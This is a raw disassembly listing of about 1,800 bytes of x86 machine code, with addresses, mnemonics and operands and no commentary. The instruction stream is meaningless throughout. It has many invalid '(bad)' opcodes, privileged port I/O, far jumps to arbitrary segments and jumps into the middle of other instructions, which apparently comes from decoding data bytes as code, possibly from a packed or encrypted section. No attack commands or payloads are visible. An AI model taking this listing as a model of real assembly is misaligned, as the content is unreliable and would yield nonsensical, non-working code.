  41f013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f014:	(bad)  
  41f016:	xchg   edx,eax
  41f017:	loopne 0x41f013
  41f019:	int3   
  41f01a:	mov    dh,0xd4
  41f01c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f01d:	sub    eax,0x7d68e94c
  41f022:	call   FWORD PTR [ecx+0x6]
  41f025:	xchg   ebx,eax
  41f026:	sbb    ecx,DWORD PTR [edx+0x56]
  41f029:	aaa    
  41f02a:	(bad)  [ebx]
  41f02c:	dec    eax
  41f02d:	pop    edx
  41f02e:	mov    dh,0x5f
  41f030:	push   ss
  41f031:	jl     0x41f027
  41f033:	inc    edx
  41f034:	xor    DWORD PTR [eax+ebx*1],ebp
  41f037:	add    ecx,ebx
  41f039:	dec    ebx
  41f03a:	dec    ecx
  41f03b:	mov    ch,0xc3
  41f03d:	jp     0x41f08e
  41f03f:	ds inc ecx
  41f041:	xor    al,ah
  41f043:	fild   DWORD PTR [ecx-0xe]
  41f046:	hlt    
  41f047:	popf   
  41f048:	pop    esi
  41f049:	ja     0x41f078
  41f04b:	pop    es
  41f04c:	shr    BYTE PTR [eax-0x46055f36],0x31
  41f053:	stos   BYTE PTR es:[edi],al
  41f054:	xlat   BYTE PTR ds:[ebx]
  41f055:	xor    al,0x9f
  41f057:	jl     0x41f0bf
  41f059:	pop    eax
  41f05a:	loope  0x41f0b2
  41f05c:	xchg   BYTE PTR [edi],al
  41f05e:	xlat   BYTE PTR ds:[ebx]
  41f05f:	aaa    
  41f060:	in     eax,0x81
  41f062:	icebp  
  41f063:	push   0x1d
  41f065:	outs   dx,DWORD PTR ds:[esi]
  41f066:	adc    BYTE PTR [ebx+0x6c],dl
  41f069:	shl    BYTE PTR [ebx],0xbf
  41f06c:	not    BYTE PTR [edx-0x65]
  41f06f:	pop    eax
  41f070:	mov    dl,0x7c
  41f072:	dec    DWORD PTR [ebp+0x7e1dc88a]
  41f078:	push   esi
  41f079:	(bad)  
  41f07a:	xchg   ebx,eax
  41f07b:	rol    BYTE PTR [ebp+0x3d336abc],cl
  41f081:	ins    BYTE PTR es:[edi],dx
  41f082:	adc    DWORD PTR [ecx+0x2b],esp
  41f085:	mov    edi,0x887e3294
  41f08a:	fbstp  TBYTE PTR [ecx-0x1a]
  41f08d:	clc    
  41f08e:	nop
  41f08f:	cwde   
  41f090:	iret   
  41f091:	inc    edx
  41f092:	cmp    eax,0x83489b7
  41f097:	mov    al,0xef
  41f099:	imul   ebx,DWORD PTR ds:0xd11cf675,0x6e
  41f0a0:	sub    bh,BYTE PTR [edi]
  41f0a2:	mov    esp,0x5f9fce99
  41f0a7:	sbb    al,0x8a
  41f0a9:	jg     0x41f041
  41f0ab:	leave  
  41f0ac:	shr    DWORD PTR [edi+0x2d],1
  41f0af:	dec    esi
  41f0b0:	into   
  41f0b1:	stos   DWORD PTR es:[edi],eax
  41f0b2:	inc    edi
  41f0b3:	out    0x92,eax
  41f0b5:	inc    ebp
  41f0b6:	push   es
  41f0b7:	dec    esi
  41f0b8:	push   ss
  41f0b9:	cmc    
  41f0ba:	test   eax,0xf5df30f8
  41f0bf:	ins    BYTE PTR es:[edi],dx
  41f0c0:	or     DWORD PTR [esi],0x66f3d109
  41f0c6:	test   DWORD PTR [ebp-0x71e69d8],eax
  41f0cc:	imul   edi,edx,0x23da754d
  41f0d2:	xor    al,0x82
  41f0d4:	pop    esi
  41f0d5:	pop    ebx
  41f0d6:	nop
  41f0d7:	out    0x9a,al
  41f0d9:	mov    al,ds:0x2f261bb3
  41f0de:	inc    ecx
  41f0df:	gs mov bh,0x95
  41f0e2:	stos   BYTE PTR es:[edi],al
  41f0e3:	js     0x41f146
  41f0e5:	add    BYTE PTR ds:0xec0b0f95,dl
  41f0eb:	test   BYTE PTR [edi],0xd4
  41f0ee:	add    DWORD PTR [esi-0x25b470c7],edi
  41f0f4:	xor    eax,0x8f4a6ae9
  41f0f9:	cld    
  41f0fa:	cli    
  41f0fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0fc:	add    BYTE PTR [esi],al
  41f0fe:	stc    
  41f0ff:	pushf  
  41f100:	mov    DWORD PTR [ebp+0x73d76590],esi
  41f106:	mov    eax,0xacb2ccfd
  41f10b:	call   0xb2a:0x23f48e06
  41f112:	(bad)  
  41f113:	mov    cl,0x59
  41f115:	pop    ds
  41f116:	(bad)  
  41f118:	stc    
  41f119:	jo     0x41f123
  41f11b:	vpshufbitqmb k6{k2}{z},ymm7,YMMWORD PTR [edx]
  41f121:	jecxz  0x41f178
  41f123:	addr16 pusha 
  41f125:	in     eax,0x42
  41f127:	outs   dx,BYTE PTR ds:[esi]
  41f128:	and    DWORD PTR [edi+0x6a],ebx
  41f12b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f12c:	mov    ds:0x8b6317d4,eax
  41f131:	cmc    
  41f132:	out    dx,eax
  41f133:	jge    0x41f15b
  41f135:	ret    
  41f136:	mov    WORD PTR [eax+esi*2+0x34],fs
  41f13a:	xor    al,0x85
  41f13c:	cli    
  41f13d:	mov    dl,0x80
  41f13f:	sbb    al,0x18
  41f141:	xchg   edx,eax
  41f142:	cmc    
  41f143:	sbb    BYTE PTR [ebp-0xf0d62b9],0xc0
  41f14a:	fsubr  QWORD PTR [ebx]
  41f14c:	jmp    0x41f19e
  41f14e:	repnz xor ebx,DWORD PTR [ecx+esi*4-0x2c43e7eb]
  41f156:	popf   
  41f157:	dec    esi
  41f158:	push   0xffffff99
  41f15a:	mov    edi,0x8e1c78ed
  41f15f:	xor    eax,0xa3fd4146
  41f164:	aad    0xfd
  41f166:	mov    esp,0x35bb2079
  41f16b:	add    ebp,DWORD PTR [ebp+0x31]
  41f16e:	in     eax,dx
  41f16f:	ficomp DWORD PTR [edx+edx*8-0x69]
  41f173:	inc    edi
  41f174:	add    ch,BYTE PTR [esi-0x68]
  41f177:	retf   0x74d3
  41f17a:	mov    ebp,0x25ff46de
  41f17f:	inc    ebp
  41f180:	jb     0x41f17d
  41f182:	pop    es
  41f183:	dec    eax
  41f184:	cmp    al,0x41
  41f186:	or     al,0x56
  41f188:	jl     0x41f13c
  41f18a:	cmp    al,0xd2
  41f18c:	mov    ebx,0xfb75fea
  41f191:	and    DWORD PTR [ecx],esi
  41f193:	cmp    eax,0x40e17f9d
  41f198:	add    BYTE PTR [edx-0x75a40000],ah
  41f19e:	mov    bh,0x6b
  41f1a0:	idiv   DWORD PTR [edi-0x24]
  41f1a3:	mov    edi,0xd9de0759
  41f1a8:	(bad)  
  41f1a9:	xor    dl,BYTE PTR [esi]
  41f1ab:	daa    
  41f1ac:	xchg   esi,eax
  41f1ad:	outs   dx,BYTE PTR ds:[esi]
  41f1ae:	add    DWORD PTR [eax],eax
  41f1b0:	xchg   BYTE PTR [edx],al
  41f1b2:	add    BYTE PTR [eax],al
  41f1b4:	add    eax,0xa281f5d6
  41f1b9:	or     edx,edi
  41f1bb:	stc    
  41f1bc:	es ss retw 0x838
  41f1c2:	test   BYTE PTR [ebx+edi*4+0x45],0xb5
  41f1c7:	sub    eax,0xe1535888
  41f1cc:	fadd   DWORD PTR [ebp+0x68]
  41f1cf:	adc    dl,BYTE PTR [edi-0xe6a7146]
  41f1d5:	pop    ss
  41f1d6:	sub    edx,esi
  41f1d8:	mov    WORD PTR [ebp-0x13bbd95c],?
  41f1de:	les    eax,FWORD PTR [edx+0x32]
  41f1e1:	sbb    BYTE PTR [ebx-0x3a9e944f],dh
  41f1e7:	rcl    BYTE PTR [eax+esi*1+0x6f],cl
  41f1eb:	loopne 0x41f248
  41f1ed:	xor    eax,0xa12f9837
  41f1f2:	mov    cl,0x82
  41f1f4:	iret   
  41f1f5:	adc    BYTE PTR [esi-0x3a],cl
  41f1f8:	std    
  41f1f9:	(bad)  
  41f1fa:	sbb    DWORD PTR [esi],edi
  41f1fc:	jnp    0x41f27d
  41f1fe:	or     al,0xd0
  41f200:	pop    esp
  41f201:	sbb    esi,eax
  41f203:	sti    
  41f204:	cli    
  41f205:	sar    bl,1
  41f207:	sub    eax,0x96b4eabc
  41f20c:	(bad)  
  41f20d:	aam    0xdc
  41f20f:	sub    al,0xdc
  41f211:	(bad)  
  41f212:	aaa    
  41f213:	(bad)  
  41f214:	sbb    edx,edi
  41f216:	xchg   ebp,eax
  41f217:	push   ds
  41f218:	repnz pop ecx
  41f21a:	leave  
  41f21b:	xor    al,0xb4
  41f21d:	ret    
  41f21e:	mov    WORD PTR [ebx],?
  41f220:	and    eax,0xbcc9a257
  41f225:	lea    ebx,[esi]
  41f227:	pop    ebx
  41f228:	icebp  
  41f229:	pop    edx
  41f22a:	lds    esi,FWORD PTR [ecx+0x1e]
  41f22d:	(bad)  
  41f22e:	or     DWORD PTR [ebp+0xc],esi
  41f231:	xchg   edx,eax
  41f232:	fidivr WORD PTR [ecx+0x2f385ec1]
  41f238:	jns    0x41f1d9
  41f23a:	adc    edi,DWORD PTR fs:[ecx]
  41f23d:	aam    0x4
  41f23f:	(bad)  
  41f240:	in     al,dx
  41f241:	or     BYTE PTR [eax+0x7578e613],ch
  41f247:	pusha  
  41f248:	into   
  41f249:	push   ds
  41f24a:	add    edx,esi
  41f24c:	imul   esi,DWORD PTR [edx],0x0
  41f24f:	cli    
  41f250:	scas   al,BYTE PTR es:[edi]
  41f251:	push   edx
  41f252:	inc    edi
  41f253:	or     eax,0x219c95b7
  41f258:	mov    esi,0x373d5243
  41f25d:	xchg   ebx,eax
  41f25e:	pusha  
  41f25f:	div    al
  41f261:	imul   edx,DWORD PTR [ecx+0x9252fca],0xfffffff9
  41f268:	push   ecx
  41f269:	push   edx
  41f26a:	out    0x29,al
  41f26c:	xor    DWORD PTR [edx],esp
  41f26e:	inc    esi
  41f26f:	mov    ds:0x9eda2bc7,eax
  41f274:	sbb    DWORD PTR [edx],0xff354757
  41f27a:	mov    ds:0x6f37081a,eax
  41f27f:	into   
  41f280:	xchg   esp,eax
  41f281:	shl    BYTE PTR [ebx-0x76],0x57
  41f285:	adc    DWORD PTR [ebx],eax
  41f287:	add    eax,0x4449eb61
  41f28c:	pop    eax
  41f28d:	add    al,BYTE PTR [ebp+0x5a6935ca]
  41f293:	ss (bad) 
  41f296:	(bad)  
  41f297:	jp     0x41f2ac
  41f299:	lock js 0x41f239
  41f29c:	jo     0x41f30e
  41f29e:	and    dl,BYTE PTR [ecx+esi*4]
  41f2a1:	int    0x1a
  41f2a3:	mov    ebp,0x692fa3ec
  41f2a8:	lods   al,BYTE PTR ds:[si]
  41f2aa:	mov    dh,0x2e
  41f2ac:	pop    ebx
  41f2ad:	push   cs
  41f2ae:	mov    BYTE PTR [eax+0x65ff1cab],dh
  41f2b4:	or     BYTE PTR [edx-0x56840af7],al
  41f2ba:	push   ebx
  41f2bb:	fucomp st(4)
  41f2bd:	pop    ds
  41f2be:	int    0xc1
  41f2c0:	dec    ecx
  41f2c1:	or     bl,BYTE PTR [edx-0x4b]
  41f2c4:	jnp    0x41f2f1
  41f2c6:	sbb    BYTE PTR [eax],bl
  41f2c8:	inc    ebx
  41f2c9:	call   0x568877b
  41f2ce:	icebp  
  41f2cf:	jle    0x41f283
  41f2d1:	sub    DWORD PTR [edx],0x9b97b577
  41f2d7:	pop    ebp
  41f2d8:	out    dx,eax
  41f2d9:	test   eax,0x8c0db49e
  41f2de:	mov    ebp,0xb131ecf4
  41f2e3:	xchg   edx,eax
  41f2e4:	mov    ebp,0xdeb0120b
  41f2e9:	mov    edi,0x39aeb59f
  41f2ee:	sar    BYTE PTR [eax+esi*8+0x5b361cd4],1
  41f2f5:	sub    eax,0x75499bb4
  41f2fa:	out    0x9c,al
  41f2fc:	popf   
  41f2fd:	pushf  
  41f2fe:	dec    eax
  41f2ff:	jl     0x41f281
  41f301:	fnstcw WORD PTR [edi+0x67]
  41f304:	scas   al,BYTE PTR es:[edi]
  41f305:	mov    eax,ds:0x5962c036
  41f30a:	lock xchg ecx,eax
  41f30c:	jp     0x41f2f8
  41f30e:	stos   DWORD PTR es:[edi],eax
  41f30f:	inc    edi
  41f310:	pop    edi
  41f311:	or     eax,0x4c7daf77
  41f316:	call   0x126835a9
  41f31b:	pop    ds
  41f31c:	mov    al,ds:0xc8209231
  41f321:	sbb    BYTE PTR [eax],0x77
  41f324:	jbe    0x41f3a4
  41f326:	push   esp
  41f327:	inc    ebx
  41f328:	ret    
  41f329:	popa   
  41f32a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f32b:	stc    
  41f32c:	idiv   BYTE PTR [ecx]
  41f32e:	nop
  41f32f:	mov    bl,0x13
  41f331:	dec    esp
  41f332:	out    0xf4,eax
  41f334:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f335:	pop    edi
  41f336:	push   ebp
  41f337:	leave  
  41f338:	enter  0xa70f,0xcd
  41f33c:	xchg   edi,eax
  41f33d:	adc    eax,0xca02729f
  41f342:	mov    al,0xaf
  41f344:	inc    ebp
  41f345:	xor    al,0x84
  41f347:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f348:	jecxz  0x41f372
  41f34a:	test   BYTE PTR [ebx-0x78],bh
  41f34d:	(bad)  
  41f34e:	fwait
  41f34f:	shl    DWORD PTR [ebp-0x5eb0f807],1
  41f355:	fimul  DWORD PTR [ebx+eax*4-0xd7e1aa2]
  41f35c:	enter  0x5606,0x1f
  41f360:	xchg   edi,eax
  41f361:	push   ss
  41f362:	cdq    
  41f363:	dec    ebp
  41f364:	push   0xad08dbe4
  41f369:	adc    eax,0x80ed7ae8
  41f36e:	pop    es
  41f36f:	out    0xb4,eax
  41f371:	scas   al,BYTE PTR es:[edi]
  41f372:	scas   al,BYTE PTR es:[edi]
  41f373:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f374:	xor    BYTE PTR [edi-0x7c],al
  41f377:	adc    ah,al
  41f379:	cmc    
  41f37a:	and    al,0xaa
  41f37c:	lea    ebx,[edi+0x41]
  41f37f:	rcr    ebx,1
  41f381:	popa   
  41f382:	inc    ebp
  41f383:	jl     0x41f3e7
  41f385:	jne    0x41f3ab
  41f387:	push   edx
  41f388:	xchg   ebx,eax
  41f389:	stos   BYTE PTR es:[edi],al
  41f38a:	xchg   ebp,eax
  41f38b:	stos   BYTE PTR es:[edi],al
  41f38c:	sbb    eax,0x4ef9400e
  41f391:	ss push ss
  41f393:	ds push 0x5f
  41f396:	(bad)  
  41f397:	pop    esp
  41f398:	push   esp
  41f399:	jne    0x41f37b
  41f39b:	(bad)  
  41f39c:	fdivr  QWORD PTR [eax-0x2cba9dbc]
  41f3a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3a3:	pop    ebp
  41f3a4:	adc    dh,ah
  41f3a6:	mov    ds:0x1dbeb891,eax
  41f3ab:	leave  
  41f3ac:	mov    ds:0x23726ce1,al
  41f3b1:	repz pusha 
  41f3b3:	out    dx,eax
  41f3b4:	mov    bh,0x67
  41f3b6:	cmp    edi,ebx
  41f3b8:	scas   eax,DWORD PTR es:[edi]
  41f3b9:	lahf   
  41f3ba:	scas   al,BYTE PTR es:[edi]
  41f3bb:	mov    eax,ds:0x78b64208
  41f3c0:	stc    
  41f3c1:	xchg   BYTE PTR [esi+edx*2-0x23],al
  41f3c5:	out    dx,eax
  41f3c6:	pop    edi
  41f3c7:	fnstcw WORD PTR [ecx+0x38]
  41f3ca:	inc    edi
  41f3cb:	loop   0x41f3e7
  41f3cd:	call   0xef3dc03b
  41f3d2:	add    BYTE PTR [eax],al
  41f3d4:	sbb    al,0x2f
  41f3d6:	sbb    eax,0xe705982c
  41f3db:	scas   eax,DWORD PTR es:[edi]
  41f3dc:	fstp   QWORD PTR [esi]
  41f3de:	and    al,0x78
  41f3e0:	cld    
  41f3e1:	mov    BYTE PTR ds:[ebx-0x5e43446d],dl
  41f3e8:	fcomp  QWORD PTR [esi-0x524dc732]
  41f3ee:	test   BYTE PTR [edx-0x69f894c8],cl
  41f3f4:	add    al,0xf9
  41f3f6:	xchg   esp,eax
  41f3f7:	ins    BYTE PTR es:[edi],dx
  41f3f8:	imul   esp,DWORD PTR [ecx-0x7386bc7],0x950237b3
  41f402:	and    DWORD PTR [ecx+0x13],eax
  41f405:	lods   al,BYTE PTR ds:[esi]
  41f406:	mov    bl,0xa7
  41f408:	sub    ecx,0x7
  41f40b:	dec    edi
  41f40c:	hlt    
  41f40d:	pop    ebp
  41f40e:	mov    esi,0x70e2f29b
  41f413:	pushf  
  41f414:	ficom  WORD PTR [ebp-0x66]
  41f417:	sbb    DWORD PTR [edi],esi
  41f419:	lods   al,BYTE PTR ds:[esi]
  41f41a:	stos   BYTE PTR es:[edi],al
  41f41b:	fisttp DWORD PTR [edx-0x33]
  41f41e:	int3   
  41f41f:	sbb    DWORD PTR [eax],ebx
  41f421:	xor    cl,BYTE PTR [eax+0xc]
  41f424:	xchg   al,bl
  41f426:	jmp    0x9dfe:0x5c3c3152
  41f42d:	cmp    DWORD PTR [edx+ecx*1],edx
  41f430:	pop    es
  41f431:	push   ds
  41f432:	jle    0x41f43e
  41f434:	cld    
  41f435:	in     al,0x1b
  41f437:	mov    ah,0x1e
  41f439:	mov    dh,0x0
  41f43b:	add    BYTE PTR [edi-0x402578e6],ah
  41f441:	(bad)  
  41f443:	jg     0x41f3f1
  41f445:	pop    ss
  41f446:	aad    0x14
  41f448:	push   cs
  41f449:	mov    dh,0x6e
  41f44b:	addr16 sbb al,0x71
  41f44e:	add    DWORD PTR [eax],eax
  41f450:	xchg   BYTE PTR [edx],al
  41f452:	add    BYTE PTR [eax],al
  41f454:	mov    DWORD PTR [eax-0x7aad85f4],edi
  41f45a:	fiadd  DWORD PTR [edi+0x934788a]
  41f460:	mov    edx,DWORD PTR ds:0x7e709e29
  41f466:	or     DWORD PTR [edi],ebx
  41f468:	sbb    ch,dl
  41f46a:	idiv   BYTE PTR [eax+ecx*8]
  41f46d:	(bad)  
  41f46e:	sbb    ch,ah
  41f470:	lods   al,BYTE PTR ds:[esi]
  41f471:	icebp  
  41f472:	or     BYTE PTR [esi+0x1c],al
  41f475:	in     eax,0x23
  41f477:	sub    DWORD PTR [ecx-0x3d57e215],0xffffffe1
  41f47e:	addr16 push ebp
  41f480:	inc    BYTE PTR [ebx]
  41f482:	push   esp
  41f483:	jl     0x41f453
  41f485:	frstor [edx-0x75]
  41f488:	fyl2x  
  41f48a:	jecxz  0x41f472
  41f48c:	pop    eax
  41f48d:	mov    ebp,0xd99d4f4e
  41f492:	popf   
  41f493:	cld    
  41f494:	push   edi
  41f495:	mov    bh,0x61
  41f497:	ja     0x41f443
  41f499:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f49a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f49b:	sbb    eax,DWORD PTR [edi+ebx*8+0x508c9e22]
  41f4a2:	xor    esi,DWORD PTR [ecx]
  41f4a4:	mov    dh,0x95
  41f4a6:	outs   dx,DWORD PTR ds:[esi]
  41f4a7:	cli    
  41f4a8:	jb     0x41f490
  41f4aa:	les    ebp,FWORD PTR es:[ebx]
  41f4ad:	inc    eax
  41f4ae:	push   ebp
  41f4af:	outs   dx,DWORD PTR ds:[esi]
  41f4b0:	in     eax,dx
  41f4b1:	pop    esi
  41f4b2:	sti    
  41f4b3:	xorps  xmm5,XMMWORD PTR ds:0x53918453
  41f4ba:	fcomp  DWORD PTR [eax+ecx*1+0x53]
  41f4be:	dec    esp
  41f4bf:	mov    eax,ds:0x5ca697cd
  41f4c4:	ins    DWORD PTR es:[edi],dx
  41f4c5:	mov    ds:0x4e4704e7,al
  41f4ca:	inc    edx
  41f4cb:	adc    BYTE PTR [ecx+0x79],dl
  41f4ce:	and    DWORD PTR [ecx-0x3576575],esp
  41f4d4:	push   cs
  41f4d5:	mov    ebx,0xd8e324
  41f4da:	test   ch,dl
  41f4dc:	push   eax
  41f4dd:	sub    DWORD PTR ss:[edx-0x5f],0x3
  41f4e2:	sbb    dl,ch
  41f4e4:	cdq    
  41f4e5:	mov    BYTE PTR ds:0x872abb30,bh
  41f4eb:	lock shl ebx,0xc7
  41f4ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4f0:	in     al,0xd0
  41f4f2:	call   DWORD PTR [ebx+edi*8]
  41f4f5:	and    edx,ebx
  41f4f7:	inc    esp
  41f4f8:	inc    ebx
  41f4f9:	adc    al,0xc7
  41f4fb:	inc    esi
  41f4fc:	xchg   DWORD PTR [ecx+0x15],esp
  41f4ff:	pop    es
  41f500:	adc    esi,ecx
  41f502:	jmp    eax
  41f504:	xlat   BYTE PTR ds:[ebx]
  41f505:	aas    
  41f506:	mov    ah,0xd
  41f508:	daa    
  41f509:	push   eax
  41f50a:	stos   DWORD PTR es:[edi],eax
  41f50b:	out    dx,al
  41f50c:	push   ebx
  41f50d:	shl    DWORD PTR [ebp-0x2dcb977a],cl
  41f513:	sub    al,0xbc
  41f515:	mov    DWORD PTR [ecx+ebx*4],edi
  41f518:	push   eax
  41f519:	mov    al,ds:0x3a07ea27
  41f51e:	mov    cl,0x8c
  41f520:	aaa    
  41f521:	popa   
  41f522:	inc    eax
  41f523:	test   esi,ebx
  41f525:	lea    ecx,[ecx+0x32]
  41f528:	jmp    0xc15:0x70f051d
  41f52f:	xchg   esp,eax
  41f530:	test   eax,esi
  41f532:	xlat   BYTE PTR ds:[ebx]
  41f533:	mov    esp,0xb203e861
  41f538:	pop    esp
  41f539:	lock fcmovu st,st(0)
  41f53c:	ins    BYTE PTR es:[edi],dx
  41f53d:	cmp    BYTE PTR [ebp+edx*8+0x70],dl
  41f541:	push   esi
  41f542:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f543:	jmp    0xf7a4:0xe96874fc
  41f54a:	mov    edi,0xee7723d9
  41f54f:	xor    eax,0xcb495129
  41f554:	adc    eax,0x778882fd
  41f559:	push   esp
  41f55a:	inc    edi
  41f55b:	dec    esi
  41f55c:	inc    edi
  41f55d:	push   es
  41f55e:	mov    edx,0xb0a300aa
  41f563:	in     eax,0xd7
  41f565:	pop    ebx
  41f566:	push   DWORD PTR [ebx+0x1a643803]
  41f56c:	jmp    0x41f546
  41f56e:	out    dx,al
  41f56f:	fld    DWORD PTR [eax]
  41f571:	or     eax,0x8c671b98
  41f576:	inc    eax
  41f577:	mov    ds:0x5e196b18,eax
  41f57c:	push   ss
  41f57d:	imul   esp,DWORD PTR [edi],0xffffffe3
  41f580:	ins    DWORD PTR es:[edi],dx
  41f581:	sbb    eax,0x9e51ba0d
  41f586:	mov    dh,0x6f
  41f588:	push   ecx
  41f589:	dec    esi
  41f58a:	adc    DWORD PTR ds:0x1f1e2808,ebp
  41f590:	popa   
  41f591:	xchg   edi,eax
  41f592:	or     BYTE PTR [esi],bl
  41f594:	xchg   BYTE PTR [edx-0x61],dl
  41f597:	test   DWORD PTR [esi+0x7c],eax
  41f59a:	stos   DWORD PTR es:[edi],eax
  41f59b:	jl     0x41f530
  41f59d:	outs   dx,BYTE PTR ds:[esi]
  41f59e:	gs dec esp
  41f5a0:	lods   eax,DWORD PTR ds:[esi]
  41f5a1:	push   edx
  41f5a2:	dec    ebp
  41f5a3:	xchg   al,ah
  41f5a5:	sub    eax,0xa6a59e09
  41f5aa:	add    bh,BYTE PTR [ecx-0x6e]
  41f5ad:	lods   eax,DWORD PTR ds:[esi]
  41f5ae:	inc    edi
  41f5af:	mov    ds:0x9d6ed35a,eax
  41f5b4:	inc    edx
  41f5b5:	(bad)  
  41f5b6:	push   ds
  41f5b7:	imul   ecx,ecx,0xffffffbd
  41f5ba:	in     al,dx
  41f5bb:	repnz or eax,0x654383de
  41f5c1:	hlt    
  41f5c2:	in     al,0xfa
  41f5c4:	dec    esi
  41f5c5:	and    DWORD PTR [ebp-0x4162f3ab],edx
  41f5cb:	xor    al,0xe9
  41f5cd:	xlat   BYTE PTR ds:[ebx]
  41f5ce:	mov    bh,0xf5
  41f5d0:	(bad)  
  41f5d1:	ficom  WORD PTR [esi-0x4e19136e]
  41f5d7:	int3   
  41f5d8:	cmp    ebx,edx
  41f5da:	and    BYTE PTR [edx-0x18],ah
  41f5dd:	clc    
  41f5de:	add    ch,BYTE PTR [ebp+edi*1-0x67b7631b]
  41f5e5:	push   ebx
  41f5e6:	push   ss
  41f5e7:	fidiv  DWORD PTR [edi+0x7d]
  41f5ea:	ins    BYTE PTR es:[edi],dx
  41f5eb:	test   eax,0x8c3fc35f
  41f5f0:	clc    
  41f5f1:	fdiv   QWORD PTR [eax]
  41f5f3:	and    dl,BYTE PTR [esi]
  41f5f5:	loopne 0x41f5d9
  41f5f7:	jle    0x41f5e3
  41f5f9:	leave  
  41f5fa:	in     al,0xc
  41f5fc:	loope  0x41f622
  41f5fe:	jge    0x41f618
  41f600:	lods   eax,DWORD PTR ds:[esi]
  41f601:	pop    esp
  41f602:	in     eax,0x98
  41f604:	aas    
  41f605:	adc    BYTE PTR [eax+0x42ea43f],al
  41f60b:	ror    BYTE PTR ds:[ecx],cl
  41f60e:	xchg   ebx,eax
  41f60f:	mov    edx,0x62af2618
  41f614:	ja     0x41f642
  41f616:	bound  esp,QWORD PTR [eax-0x39]
  41f619:	add    ecx,esp
  41f61b:	int3   
  41f61c:	xchg   ecx,eax
  41f61d:	ja     0x41f638
  41f61f:	sub    edx,DWORD PTR [ebx-0x47]
  41f622:	sub    DWORD PTR [ecx+0x58977923],0xffffffb3
  41f629:	jo     0x41f6a1
  41f62b:	icebp  
  41f62c:	jp     0x41f5f9
  41f62e:	sahf   
  41f62f:	push   sp
  41f631:	jmp    0xbd99:0xa77bb43a
  41f638:	xchg   edx,eax
  41f639:	repnz out 0x4b,eax
  41f63c:	je     0x41f635
  41f63e:	and    eax,DWORD PTR [edx]
  41f640:	adc    esp,DWORD PTR [edx-0x1f]
  41f643:	mov    dl,0x8d
  41f645:	push   ss
  41f646:	mov    ebp,0x9e85dc3b
  41f64b:	outs   dx,BYTE PTR ds:[esi]
  41f64c:	add    edx,ecx
  41f64e:	xlat   BYTE PTR ds:[ebx]
  41f64f:	cld    
  41f650:	pop    ds
  41f651:	pop    ds
  41f652:	hlt    
  41f653:	sbb    BYTE PTR [esi],0x56
  41f656:	xor    ebx,esi
  41f658:	mov    ecx,DWORD PTR [ecx]
  41f65a:	jecxz  0x41f68d
  41f65c:	mov    ch,BYTE PTR [esi-0x5dc99f73]
  41f662:	addr16 or ebp,edi
  41f665:	push   ecx
  41f666:	out    dx,al
  41f667:	mov    esp,0xe1176979
  41f66c:	ss dec ecx
  41f66e:	fs pop esp
  41f670:	or     eax,0x462f7883
  41f675:	cmp    eax,0x66b772d2
  41f67a:	dec    ebp
  41f67b:	in     eax,0xf4
  41f67d:	sahf   
  41f67e:	scas   eax,DWORD PTR es:[edi]
  41f67f:	jbe    0x41f6c3
  41f681:	dec    esi
  41f682:	xlat   BYTE PTR ds:[ebx]
  41f683:	inc    ebx
  41f684:	adc    esi,DWORD PTR [edi]
  41f686:	xor    DWORD PTR [eax+0x36],eax
  41f689:	xor    al,BYTE PTR [edx+0x43df3dd5]
  41f68f:	jl     0x41f6fc
  41f691:	or     DWORD PTR [edx-0xe],eax
  41f694:	xor    bh,BYTE PTR [esp+ebp*2-0x685b10cb]
  41f69b:	cmp    DWORD PTR [eax+0x7f],0x7ca6508c
  41f6a2:	scas   al,BYTE PTR es:[edi]
  41f6a3:	mov    bh,0x28
  41f6a5:	inc    edx
  41f6a6:	mov    dl,0x23
  41f6a8:	mov    ebx,0xede762ee
  41f6ad:	out    0xbf,al
  41f6af:	int    0xd5
  41f6b1:	jp     0x41f6fe
  41f6b3:	in     eax,dx
  41f6b4:	sbb    al,0xff
  41f6b6:	xor    BYTE PTR [edx],0xe0
  41f6b9:	jbe    0x41f6d3
  41f6bb:	xchg   edx,eax
  41f6bc:	lods   al,BYTE PTR ss:[esi]
  41f6be:	pop    edi
  41f6bf:	(bad)  
  41f6c0:	retf   
  41f6c1:	fild   DWORD PTR [esi-0x7a]
  41f6c4:	mov    BYTE PTR [ecx-0x259dcba7],dl
  41f6ca:	call   0x94f46988
  41f6cf:	sti    
  41f6d0:	enter  0x3f51,0xb4
  41f6d4:	and    ebx,DWORD PTR [edx+eax*4-0x6e]
  41f6d8:	or     al,0xf1
  41f6da:	add    BYTE PTR [eax],al
  41f6dc:	popf   
  41f6dd:	paddd  mm4,QWORD PTR [esi+edi*8-0x6c0200b]
  41f6e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6e6:	mov    bl,0x6e
  41f6e8:	pop    eax
  41f6e9:	xchg   BYTE PTR [ecx+0x51],ch
  41f6ec:	mov    ds:0x86000173,al
  41f6f1:	add    al,BYTE PTR [eax]
  41f6f3:	add    BYTE PTR [esi-0x2],al
  41f6f6:	outs   dx,BYTE PTR ds:[esi]
  41f6f7:	xor    dh,dh
  41f6f9:	int3   
  41f6fa:	inc    ebp
  41f6fb:	inc    esi
  41f6fc:	les    ecx,FWORD PTR [edx]
  41f6fe:	xchg   BYTE PTR [ebp-0x651b527c],bh
  41f704:	push   edx
  41f705:	mov    esp,0x8c70c850
  41f70a:	rol    DWORD PTR [ebx-0x4b],cl
  41f70d:	pop    ss
  41f70e:	in     al,0x18
  41f710:	inc    edx
  41f711:	in     eax,0x4d
  41f713:	nop
  41f714:	inc    ebp
  41f715:	push   ss
  41f716:	sbb    DWORD PTR [esi+0x72],0xbcedb3e0
  41f71d:	sbb    ebp,esp
  41f71f:	sbb    edx,eax
  41f721:	pop    edi
  41f722:	mov    ah,0x11
  41f724:	jnp    0x41f760
  41f726:	mov    WORD PTR [edx],gs
  41f728:	ret    
